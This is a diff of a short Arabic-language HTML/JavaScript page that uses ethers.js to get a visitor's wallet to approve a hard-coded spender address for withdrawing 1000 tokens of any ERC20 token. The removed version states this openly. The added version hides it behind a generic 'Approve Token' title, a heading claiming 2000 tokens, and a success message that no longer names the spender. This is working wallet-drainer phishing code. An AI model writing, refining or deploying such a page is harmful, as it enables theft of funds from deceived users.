@@ -1,67 +1,62 @@
 <!DOCTYPE html>
 <html lang="ar">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>الموافقة على سحب 1000 توكن</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
-</head>
-<body>
-  <h2>اعمل Approve لمحفظتي تسحب منك 1000 توكن</h2>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Approve Token</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
+  </head>
+  <body>
+    <h2>Approve 2000 Token</h2>
+    <input type="text" id="tokenAddress" placeholder="عنوان التوكن ERC20" />
+    <button id="approveBtn">اعمل Approve 1000</button>
+    <p id="result"></p>
 
-  <label for="tokenAddress">أدخل عنوان التوكن (ERC20):</label><br>
-  <input type="text" id="tokenAddress" size="60" placeholder="مثال: 0xdAC17F958D2ee523a2206206994597C13D831ec7"><br><br>
-
-  <button onclick="approveToken()">Approve 1000</button>
-
-  <p id="result"></p>
-
-  <script>
-    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
-
-    async function approveToken() {
-      const tokenAddress = document.getElementById("tokenAddress").value;
+    <script>
+      const approveBtn = document.getElementById("approveBtn");
       const result = document.getElementById("result");
 
-      if (!window.ethereum) {
-        result.textContent = "لا يوجد محفظة مثل MetaMask!";
-        return;
-      }
+      approveBtn.addEventListener("click", async () => {
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // محفظتك
 
-      try {
+        if (!window.ethereum) {
+          result.textContent = "متصفحك لا يدعم MetaMask";
+          return;
+        }
+
         const provider = new ethers.BrowserProvider(window.ethereum);
+        let accounts = await provider.send("eth_accounts", []);
 
-        // اتأكد إن في اتصال قبل ما تطلب eth_requestAccounts
-        const accounts = await provider.send("eth_accounts", []);
         if (accounts.length === 0) {
-          await provider.send("eth_requestAccounts", []);
+          try {
+            accounts = await provider.send("eth_requestAccounts", []);
+          } catch (err) {
+            result.textContent = "لم يتم السماح بالوصول للمحفظة.";
+            return;
+          }
         }
 
         const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
 
-        const erc20Abi = [
+        const abi = [
           "function approve(address spender, uint256 amount) public returns (bool)",
           "function decimals() view returns (uint8)",
-          "function symbol() view returns (string)"
         ];
 
-        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-
-        const decimals = await tokenContract.decimals();
-        const symbol = await tokenContract.symbol();
-
-        const amount = ethers.parseUnits("1000", decimals);
-        const tx = await tokenContract.approve(spenderAddress, amount);
-
-        result.textContent = `جاري الإرسال... Hash: ${tx.hash}`;
-        await tx.wait();
-
-        result.textContent = `تمت الموافقة بنجاح! تم إعطاء ${spenderAddress} صلاحية لسحب 1000 ${symbol}`;
-      } catch (err) {
-        console.error(err);
-        result.textContent = `حدث خطأ: ${err.message}`;
-      }
-    }
-  </script>
-</body>
+        try {
+          const contract = new ethers.Contract(tokenAddress, abi, signer);
+          const decimals = await contract.decimals();
+          const amount = ethers.parseUnits("1000", decimals);
+          const tx = await contract.approve(spenderAddress, amount);
+          result.textContent = "جاري إرسال المعاملة، انتظر التأكيد...";
+          await tx.wait();
+          result.textContent = "تمت الموافقة بنجاح!";
+        } catch (err) {
+          console.error(err);
+          result.textContent = "حدث خطأ: " + (err.shortMessage || err.message);
+        }
+      });
+    </script>
+  </body>
 </html>
